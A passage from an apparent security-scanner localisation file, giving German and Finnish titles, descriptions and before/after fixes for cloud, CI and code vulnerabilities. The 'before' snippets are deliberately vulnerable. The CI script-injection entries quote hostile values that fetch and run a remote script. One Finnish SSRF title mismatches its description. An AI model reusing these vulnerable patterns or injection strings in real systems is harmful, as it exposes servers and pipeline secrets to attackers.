    title: original.title.replace("Dipendenza vulnerabile:", "Verwundbare Abhängigkeit:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Noch keine behobene Version bekannt — erwäge ein alternatives Paket oder verfolge die Updates des Projekts."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "Ein Secret ist direkt in einer ENV- oder ARG-Anweisung des Dockerfiles geschrieben",
    description:
      "Eine Variable mit einem Namen wie password/secret/token/key hat einen literalen Wert in einer ENV- oder ARG-Anweisung. Anders als bei einer .env-Datei (die normalerweise nicht im Image landet), wird dieser Wert direkt in das Docker-Image eingebacken — wer es pullen oder die Layer-Historie inspizieren kann, erhält ihn, selbst wenn die Zeile in einer späteren Version des Dockerfiles entfernt wird.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# übergeben mit: docker build --build-arg DB_PASSWORD=*** (oder, noch besser,\n# mit einem BuildKit-Secret-Mount, der nie in der Layer-Historie landet)`,
    },
  },
  "docker-missing-user": {
    title: "Das Dockerfile legt keinen Non-Root-Nutzer fest",
    description:
      "Keine USER-Anweisung im Dockerfile: Ohne sie läuft der Container als Root. Gelingt es einem Angreifer, Code innerhalb des Containers auszuführen (z. B. durch Ausnutzen einer verwundbaren Bibliothek), macht Root innerhalb des Containers einen möglichen Ausbruch zum Host — oder eine breitere Auswirkung auf das umgebende System — leichter.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Das Basis-Image des Dockerfiles verwendet den Tag ":latest"',
    description:
      'Eine FROM-Anweisung verwendet explizit den Tag ":latest" statt einer genauen Version. "latest" ändert sich im Laufe der Zeit: Derselbe Build, zu einem anderen Zeitpunkt erneut durchgeführt, kann eine andere Version des Basis-Images erhalten — ein nicht reproduzierbarer Build, und ein unerwünschtes Update kann ankommen, ohne dass es jemand entschieden hat.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Das Dockerfile lädt eine Remote-Datei mit ADD statt COPY herunter",
    description:
      "Die ADD-Anweisung mit einer http/https-URL lädt während des Builds eine Datei aus dem Internet herunter, ohne Integritätsprüfung und ohne dass der Inhalt im Repository sichtbar ist. Wird diese URL später kompromittiert, übernimmt der Build beliebigen Inhalt, ohne dass es jemand beim Lesen des Dockerfiles bemerkt.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<erwarteter Hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Ein Container im Kubernetes-Manifest läuft als privileged",
    description:
      '"privileged: true" im securityContext eines Containers deaktiviert fast die gesamte übliche Isolation zwischen Container und Host: Der Container kann auf die Geräte des Hosts zugreifen, dessen Netzwerkkonfiguration ändern und in vielen Fällen faktisch Root-Zugriff auf die ausführende Maschine erlangen. Für eine normale App fast nie nötig.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # nur die wirklich nötigen Capabilities`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Ein Secret ist im Klartext in einer env-Variable des Kubernetes-Manifests geschrieben",
    description:
      'Eine Umgebungsvariable mit einem Namen wie password/secret/token/key hat einen literalen Wert ("value:"), statt aus einem Secret gelesen zu werden ("valueFrom.secretKeyRef"). Das Manifest selbst — oft in ein Repository committet — enthält das Secret damit im Klartext, sichtbar auch für jemanden, der nur die Konfiguration lesen, aber nicht unbedingt Befehle im Cluster ausführen kann.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Ein Container im Kubernetes-Manifest ist so eingestellt, dass er als Root läuft",
    description:
      '"runAsUser: 0" oder "runAsNonRoot: false" im securityContext erzwingen explizit die Ausführung als Root innerhalb des Containers. Gelingt es einem Angreifer, Code im Container auszuführen (z. B. durch Ausnutzen einer verwundbaren Bibliothek), macht Root innerhalb des Containers einen möglichen Ausbruch zum Host — oder eine breitere Auswirkung — leichter.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Ein Container im Kubernetes-Manifest kann mehr Rechte erlangen, als er anfangs hatte",
    description:
      '"allowPrivilegeEscalation: true" im securityContext erlaubt es einem Prozess innerhalb des Containers, mehr Rechte zu erlangen als der Prozess, der ihn gestartet hat (z. B. über ein Binary mit Setuid-Bit). In Kombination mit einer Schwachstelle in der Anwendung ist das ein weiterer Schritt in Richtung Codeausführung mit mehr Rechten als vorgesehen.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Ein Pod im Kubernetes-Manifest teilt sich das Netzwerk, die Prozesse oder den gemeinsamen Speicher des Hosts",
    description:
      '"hostNetwork", "hostPID" oder "hostIPC" auf true gesetzt, holen den Pod aus seiner normalen Isolation heraus: hostNetwork macht den Pod im Netzwerk des Hosts sichtbar (unter Umgehung der Netzwerk-Policies des Clusters), hostPID gibt ihm Einblick in alle Prozesse der Host-Maschine, hostIPC gibt ihm Zugriff auf den gemeinsamen Speicher des Hosts. Für eine normale App fast nie nötig — typischerweise nur für systemnahe Tools/Monitoring.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Das Kubernetes-Manifest erzwingt nicht explizit die Ausführung als Non-Root-Nutzer",
    description:
      'Kein "runAsNonRoot" irgendwo im Manifest (weder auf Pod- noch auf Container-Ebene): Ohne diese Einstellung läuft ein Container als der in seinem Image definierte Nutzer — oft standardmäßig Root, falls das Image selbst das nicht geändert hat. Setzt man es explizit auf true, scheitert der Start des Pods, falls das Image weiterhin versucht, als Root zu laufen, statt es erst nach einem Vorfall zu entdecken.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Ein von einem externen Nutzer kontrollierter Wert durchläuft in der GitLab-CI-Pipeline eine zweite Shell',
      description: 'Eine "script:"-Zeile (oder "before_script:"/"after_script:") verwendet "eval" oder "sh -c"/"bash -c" zusammen mit einer vordefinierten GitLab-Variable wie dem Titel der Merge Request, der Commit-Message oder dem Branch-Namen — all das kann jeder schreiben, der eine Merge Request öffnet, auch aus einem externen Fork. Der Wert wird zuerst von der äußeren Shell expandiert und dann in einen String eingefügt, den die zweite Shell erneut als Code interpretiert: ein Titel wie "$(curl malware.sh | sh)" würde in der Pipeline beliebige Befehle ausführen, mit Zugriff auf alle in diesem Job verfügbaren Secrets.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # als Argument an den Befehl übergeben, nie innerhalb eines "bash -c"-Strings, der es erneut interpretieren würde`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker in der GitLab-CI-Pipeline läuft mit deaktivierter TLS-Verschlüsselung',
      description: 'Der Job nutzt den Dienst "docker:dind" (Docker-in-Docker, nötig um Images innerhalb der Pipeline zu bauen), setzt aber "DOCKER_TLS_CERTDIR" auf einen leeren String und deaktiviert damit die TLS-Verschlüsselung zwischen Docker-Client und dind-Daemon vollständig. Ohne TLS kann jeder, der diesen Port im selben internen Netzwerk des Runners erreicht, den Docker-Daemon kontrollieren — der mit erweiterten Rechten läuft — statt auf den Job beschränkt zu sein, der ihn eigentlich nutzen soll.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS bleibt zwischen Docker-Client und dind-Daemon aktiv — "" deaktiviert es vollständig`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'Das Docker-Image der GitLab-CI-Pipeline ist nicht auf eine bestimmte Version festgelegt',
      description: 'Ein "image:" der Pipeline verweist auf ein Image ohne Tag (entspricht ":latest") oder explizit auf ":latest". Wer dieses Image pflegt, kann dessen Inhalt jederzeit austauschen, ohne dass sich das Repository ändert — dieselbe Pipeline kann von einem Tag auf den anderen plötzlich anderen Code ausführen, ein Supply-Chain-Risiko, das konzeptionell identisch mit einer per Tag statt per Commit referenzierten GitHub Action ist.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # ein konkreter Tag (oder noch besser ein Digest "node@sha256:...") statt "latest"`,
      },
    },
},
  fi: {
  "supabase-service-role-in-client": {
    title: "Supabasen salainen avain päätyy selaimelle tarkoitettuun tiedostoon",
    description:
      "Julkisella etuliitteellä varustettu muuttuja (esim. NEXT_PUBLIC_, VITE_) tai asiakaspuolen tiedosto viittaa Supabasen service role -avaimeen. Tämä avain ohittaa Row Level Securityn: jos se päätyy selaimen bundleen, kuka tahansa voi lukea sen ja toimia tietokannan pääkäyttäjänä.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (vain palvelin)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Koodissa on suoraan kirjoitettuja salasanoja tai salaisia avaimia",
    description:
      "API-avain, token tai salasana näyttää olevan kirjoitettu suoraan literaaliarvona sen sijaan, että se luettaisiin ympäristömuuttujasta. Jokainen, joka lukee lähdekoodin (tai repositorion, jos se on julkinen), saa haltuunsa tämän salaisuuden.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Analysoitujen tiedostojen joukossa on tiedosto, jossa on projektin oikeat salasanat",
    description:
      ".env-tiedosto oikeilla arvoilla (ei .env.example) on mukana analyysissä. Jos tämä tiedosto päätyy repositorioon tai julkiseen julkaisuun, kaikki sen sisältämät tunnukset paljastuvat.",
    fix: {
      before: `# .env (commitoitu vahingossa)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (commitoitu)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env pysyy repositorion ulkopuolella (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Kuka tahansa voi lukea tai muokata kaikkien käyttäjien tietoja",
    description:
      "Row Level Security on pois käytöstä, tai jokin policy sallii pääsyn kaikille (USING (true)) tarkistamatta, kuka pyynnön tekee. Jokainen kirjautunut käyttäjä — tai jopa anonyymi — voi lukea tai muokata kaikkien muiden tietoja.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Käyttäjän syöttämä arvo liitetään suoraan tietokantakyselyyn",
    description:
      "SQL-kysely rakennetaan yhdistämällä tai interpoloimalla merkkijono suoraan sen sijaan, että käytettäisiin parametreja. Jos tämä teksti tulee (vaikka välillisesti) käyttäjältä, se voi muuttaa itse kyselyä — SQL-injektio.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Salasanat eivät näytä olevan suojattuja",
    description:
      "Salasanakenttä tallennetaan juuri sellaisena kuin se saapui pyynnössä, eikä tiedostossa näy yhtään hash-funktiota (bcrypt, argon2, scrypt). Jos tietokanta joutuu vaarantumaan, kaikki salasanat ovat heti käyttökelpoisia.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Kirjautumisten allekirjoittamiseen käytetty secret on kirjoitettu selväkielisenä koodiin",
    description:
      "jwt.sign / jwt.verify -funktiolle annettu secret (tai JWT_SECRET-muuttuja) on literaaliarvo koodissa sen sijaan, että se tulisi ympäristömuuttujasta. Jokainen, joka lukee sen, voi luoda kelvollisia pääsytunnuksia millä tahansa käyttäjällä.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Palvelin voidaan pakottaa suorittamaan ulkoisia komentoja",
    description:
      "Järjestelmäkomentoja suorittava funktio (exec, execSync, spawn) saa merkkijonon, joka on rakennettu interpoloimalla tai yhdistämällä. Jos osa tästä merkkijonosta tulee käyttäjän syötteestä, sen hallitsija voi suorittaa mielivaltaisia komentoja palvelimella.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Palvelimen tiedosto voidaan lukea tai kirjoittaa valitsemalla polku ulkopuolelta",
    description:
      "Tiedostoa lukeva, kirjoittava tai lähettävä funktio saa polun suoraan pyynnön arvosta (query, body, params) tarkistamatta, että se pysyy sallitun kansion sisällä. Hyökkääjä voi lisätä \"../\" päästäkseen ulos aiotusta kansiosta ja lukeakseen tai korvatakseen mielivaltaisia tiedostoja palvelimella (esim. tunnuksia sisältävän asetustiedoston).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Polku ei ole sallittu")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Käyttäjän syöttämä arvo suoritetaan koodina MongoDB-kyselyn sisällä",
    description:
      "MongoDBn $where-operaattori suorittaa palvelinpuolen JavaScriptiä jokaiselle dokumentille — jos tämä merkkijono rakennetaan yhdistämällä käyttäjältä tuleva arvo, sen hallitsija voi saada mielivaltaista koodia suoritettua tietokannan kontekstissa, ei vain muuttaa suodatinta kuten tavallisessa SQL-injektiossa.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Käyttäjän syöttämä arvo tulkitaan templatena, ei datana",
    description:
      "Templaten kääntävä/suorittava funktio saa KOKO templaten pyynnön arvosta, sen sijaan että käytettäisiin kiinteää templatea ja välitettäisiin vain data. Hyökkääjä voi kirjoittaa suoraan template-moottorin syntaksilla (esim. {{7*7}} Jinja2:lle) ja suorittaa koodia palvelimella — Server-Side Template Injection, joka johtaa usein mielivaltaisten komentojen suorittamiseen, ei vain näyttöongelmaan kuten XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-jäsennin voidaan pakottaa lukemaan tiedostoja tai tekemään ulkoisia pyyntöjä",
    description:
      "XML-jäsennin (DocumentBuilderFactory) luodaan poistamatta eksplisiittisesti käytöstä ulkoisia entiteettejä (DOCTYPE) lähellä olevilla riveillä. Jos jäsennin saa XML:ää epäluotettavasta lähteestä, hyökkääjä voi määritellä ulkoisen entiteetin lukeakseen tiedostoja palvelimelta tai saadakseen sen ottamaan yhteyttä valitsemaansa osoitteeseen — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Salaisuus on kirjoitettu suoraan Dockerfilen ENV- tai ARG-käskyyn",
    description:
      "Muuttujalla, jonka nimi on tyyliin password/secret/token/key, on literaaliarvo ENV- tai ARG-käskyssä. Toisin kuin .env-tiedosto (joka ei yleensä päädy imageen), tämä arvo leivotaan suoraan Docker-imageen — kuka tahansa, joka voi tehdä pullin tai tarkastella layerien historiaa, saa sen talteen, vaikka rivi poistettaisiin Dockerfilen myöhemmästä versiosta.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# välitetään komennolla: docker build --build-arg DB_PASSWORD=*** (tai vielä\n# parempi: BuildKitin secret mount, joka ei koskaan päädy layerien historiaan)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes-manifestin kontti ajetaan privileged-tilassa",
    description:
      '"privileged: true" kontin securityContextissa poistaa käytöstä lähes kaiken tavanomaisen eristyksen kontin ja hostin välillä: kontti pääsee käsiksi hostin laitteisiin, voi muuttaa sen verkkoasetuksia ja saa monissa tapauksissa käytännössä root-oikeudet koneeseen, joka sitä suorittaa. Lähes koskaan tarpeen tavalliselle sovellukselle.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # vain oikeasti tarvittavat capabilityt`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Salaisuus on kirjoitettu selväkielisenä Kubernetes-manifestin env-muuttujaan",
    description:
      'Ympäristömuuttujalla, jonka nimi on tyyliin password/secret/token/key, on literaaliarvo ("value:") sen sijaan, että se luettaisiin Secretistä ("valueFrom.secretKeyRef"). Itse manifesti — usein commitoitu repositorioon — sisältää siis salaisuuden selväkielisenä, näkyvissä jopa sille, joka voi vain lukea konfiguraation, ei välttämättä suorittaa komentoja klusterissa.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Terraform-security group avaa arkaluonteisen portin koko internetille",
    description:
      'Sääntö, jonka "cidr_blocks" sisältää 0.0.0.0/0 (minkä tahansa IP-osoitteen), on lähellä arkaluonteista porttia — SSH (22), RDP (3389) tai tyypillinen tietokantaportti (MySQL, Postgres, MongoDB, Redis, SQL Server). Kuka tahansa internetissä voi yrittää yhdistää tähän palveluun, ei vain se, jonka pitäisi.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # vain oma yksityinen verkkosi, tai bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Google Cloud -palomuurisääntö avaa arkaluonteisen portin koko internetille",
    description:
      'Resurssi "google_compute_firewall", jonka "source_ranges" sisältää 0.0.0.0/0 (minkä tahansa IP-osoitteen), sallii liikenteen arkaluonteiseen porttiin — SSH (22), RDP (3389) tai tyypillinen tietokantaportti (MySQL, Postgres, MongoDB, Redis, SQL Server). Kuka tahansa internetissä voi yrittää yhdistää tähän palveluun, ei vain se, jonka pitäisi.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # vain oma yksityinen verkkosi, tai bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Azure-verkkosääntö avaa arkaluonteisen portin koko internetille",
    description:
      'Verkon suojaussääntö ("azurerm_network_security_rule", tai "security_rule"-lohko "azurerm_network_security_group"-resurssin sisällä), jonka "source_address_prefix" on "*" tai "0.0.0.0/0", suunta "Inbound" ja käyttöoikeus "Allow", lähellä arkaluonteista porttia — SSH (22), RDP (3389) tai tyypillinen tietokantaportti. Kuka tahansa internetissä voi yrittää yhdistää tähän palveluun, ei vain se, jonka pitäisi.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # vain oma yksityinen verkkosi, tai bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Salaisuus on kirjoitettu Terraform-muuttujan oletusarvoksi",
    description:
      'Muuttujalla, jonka nimi on tyyliin password/secret/token/key, on literaaliarvo sen "default"-kentässä. Toisin kuin ajonaikana välitetty arvo (tfvars, TF_VAR_*-ympäristömuuttujat), oletusarvo päätyy lähdekoodiin — ja jos repositorio on jaettu tai julkinen, kuka tahansa näkee sen, jopa ilman pääsyä Terraform-tilaan.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # ei oletusarvoa: välitä .tfvars-tiedostolla (gitin ulkopuolella) tai TF_VAR_db_password-ympäristömuuttujalla\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Ulkoisen käyttäjän hallitsema arvo päätyy suoraan CI:n shell-komentoon",
    description:
      'GitHub Actions -workflown "run:"-komento interpoloi suoraan arvon, kuten pull requestin otsikon, branchin nimen tai kommentin tekstin — kaikki kirjoitettavissa kenen tahansa toimesta, joka avaa pull requestin tai kommentin, jopa ulkoisesta forkista. Arvo kuten `"; curl malware.sh | sh #` suorittaisi mielivaltaisia komentoja CI:ssä, pääsyllä kaikkiin kyseisessä workflow\'ssa saatavilla oleviin salaisuuksiin.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # välitetty ympäristömuuttujana, ei koskaan interpoloitu suoraan komentoon`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow suorittaa ulkoisen pull requestin koodin pääsyllä repositorion salaisuuksiin",
    description:
      'Workflow käyttää "pull_request_target" -tapahtumaa — joka ajetaan perusrepositorion oikeuksilla ja salaisuuksilla jopa ulkopuolisesta forkista avatulle pull requestille — ja tekee checkoutin itse pull requestin koodista ("github.event.pull_request.head"), ei perusbranchista. Pull requestin avaaja saa käytännössä oman koodinsa suoritukseen pääsyllä näihin salaisuuksiin.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Tekee checkoutin perusbranchista, ei PR:n koodista — tai käytä\n      # "pull_request" "pull_request_target":n sijaan, jos et tarvitse\n      # laajempia oikeuksia/salaisuuksia.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Pyynnön data deserialisoidaan formaatilla, joka voi suorittaa koodia",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) tai node-serialize-kirjasto (Node) deserialisoi arvon, joka on otettu suoraan pyynnöstä. Toisin kuin JSON, nämä formaatit voivat esittää ja suorittaa koodia jo itse deserialisoinnin aikana — lähetetyn arvon hallitsija voi saada mielivaltaisen koodin suoritettua palvelimella.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON ei koskaan suorita koodia jäsennyksen aikana, toisin kuin pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Koodi hyväksyy eksplisiittisesti allekirjoittamattomia JWT-tokeneita ("none"-algoritmi)',
    description:
      '"none" esiintyy JWT-tokenin varmentamiseen hyväksyttyjen algoritmien joukossa. Tokenilla, jonka algoritmi on "none", ei ole allekirjoitusta varmennettavaksi: kuka tahansa voi rakentaa sellaisen millä tahansa sisällöllä (esim. admin-roolilla), ja koodi hyväksyisi sen kelvollisena.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // älä koskaan sisällytä "none"-arvoa hyväksyttyihin algoritmeihin`,
    },
  },
  "unprotected-new-table": {
    title: "Uusi taulu näyttää luodun ilman suojausta",
    description:
      "SQL-migraatio luo taulun, mutta ei ota Row Level Securitya käyttöön samalle taululle samassa tiedostossa. Niin kauan kuin tilanne on tämä, taululla ei alussa ole mitään rajoitusta sille, kuka voi lukea tai kirjoittaa sitä.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Sivusto hyväksyy pyyntöjä mistä tahansa muusta sivustosta",
    description:
      "CORS-otsikko on asetettu hyväksymään pyyntöjä miltä tahansa origin-arvolta (*), tai cors()-middlewarea käytetään ilman rajoituksia. Mikä tahansa kolmannen osapuolen sivusto voi kutsua API:jasi jo kirjautuneen käyttäjän selaimesta.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://sivustosi.fi"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Admin-oikeuksin varustettu funktio ei tarkista, kuka sitä käyttää",
    description:
      "Reitti tai funktio, jonka nimi viittaa admin-operaatioihin, ei sisällä lähellä olevilla riveillä mitään autentikointi- tai roolitarkistusta. Kuka tahansa URL:n tunteva voisi suorittaa sen.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Sivusto voidaan pakottaa suorittamaan ulkoista koodia",
    description:
      "Lähtevä HTTP-pyyntö (fetch, axios) käyttää suoraan käyttäjän pyynnöstä tulevaa arvoa kohdeosoitteena. Haitallinen käyttäjä voi saada palvelimesi kutsumaan sisäisiä tai mielivaltaisia osoitteita — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.omapalvelusi.fi"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL ei ole sallittu")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Salasanat on suojattu menetelmällä, joka on nykyään helppo murtaa",
    description:
      "Samalla rivillä md5() tai sha1() sovelletaan salasanaan liittyvään arvoon. Nämä algoritmit ovat liian nopeita laskea: hyökkääjä, jolla on tietokanta, voi kokeilla miljardeja salasanoja sekunnissa.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes-manifestin kontti on asetettu ajettavaksi roottina",
    description:
      '"runAsUser: 0" tai "runAsNonRoot: false" securityContextissa pakottaa eksplisiittisesti kontin ajamaan roottina. Jos hyökkääjä onnistuu suorittamaan koodia kontissa (esim. hyödyntämällä haavoittuvaa kirjastoa), root kontin sisällä tekee mahdollisesta pakoyrityksestä hostille — tai laajemmasta vaikutuksesta — helpomman.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes-manifestin kontti voi saada enemmän oikeuksia kuin sillä aluksi oli",
    description:
      '"allowPrivilegeEscalation: true" securityContextissa sallii kontin sisällä olevan prosessin saada enemmän oikeuksia kuin sen käynnistänyt prosessi (esim. setuid-binäärin kautta). Yhdistettynä sovelluksen haavoittuvuuteen tämä on yksi askel lähemmäs koodin suorittamista suuremmilla oikeuksilla kuin on tarkoitettu.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes-manifestin pod jakaa hostin verkon, prosessit tai jaetun muistin",
    description:
      '"hostNetwork", "hostPID" tai "hostIPC" asetettuna true-arvoon vie podin pois sen normaalista eristyksestä: hostNetwork altistaa podin hostin verkolle (ohittaen klusterin verkkopolitiikat), hostPID antaa sille näkyvyyden kaikkiin hostkoneen prosesseihin, hostIPC antaa sille pääsyn hostin jaettuun muistiin. Lähes koskaan tarpeen tavalliselle sovellukselle — tyypillisesti vain matalan tason järjestelmä-/valvontatyökaluille.',
    fix: {
